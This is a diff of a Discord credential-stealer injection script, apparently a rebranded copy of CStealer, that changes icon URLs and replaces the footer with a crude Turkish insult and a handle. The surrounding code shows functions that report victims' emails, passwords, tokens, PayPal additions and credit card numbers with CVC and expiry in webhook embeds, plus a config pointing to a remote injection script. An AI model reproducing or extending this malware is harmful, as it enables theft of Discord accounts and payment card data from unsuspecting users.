@@ -12,7 +12,7 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'herkeziyemeyeandictim', 
-  embed_icon: 'https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png'.replace(/ /g, '%20'), 
+  embed_icon: 'https://cdn.discordapp.com/avatars/1124088298265129032/3a0b687c139c9894a5dd872b845c2feb'.replace(/ /g, '%20'), 
   embed_color: 16777215, 
   injection_url: 'https://raw.githubusercontent.com/skillissue0/test/main/testing.js', 
   /**
@@ -680,8 +680,8 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'anani sikerim | voltou.1337',
+            icon_url: "https://cdn.discordapp.com/avatars/1124088298265129032/3a0b687c139c9894a5dd872b845c2feb"
         },
       },
     ],
@@ -723,8 +723,8 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'anani sikerim | voltou.1337',
+            icon_url: "https://cdn.discordapp.com/avatars/1124088298265129032/3a0b687c139c9894a5dd872b845c2feb"
         },
       },
     ],
@@ -766,8 +766,8 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'anani sikerim | voltou.1337',
+            icon_url: "https://cdn.discordapp.com/avatars/1124088298265129032/3a0b687c139c9894a5dd872b845c2feb"
         },
       },
     ],
@@ -809,8 +809,8 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'anani sikerim | voltou.1337',
+            icon_url: "https://cdn.discordapp.com/avatars/1124088298265129032/3a0b687c139c9894a5dd872b845c2feb"
         },
       },
     ],
@@ -852,8 +852,8 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'anani sikerim | voltou.1337',
+            icon_url: "https://cdn.discordapp.com/avatars/1124088298265129032/3a0b687c139c9894a5dd872b845c2feb"
         },
       },
     ],
@@ -897,8 +897,8 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'anani sikerim | voltou.1337',
+            icon_url: "https://cdn.discordapp.com/avatars/1124088298265129032/3a0b687c139c9894a5dd872b845c2feb"
         },
       },
     ],
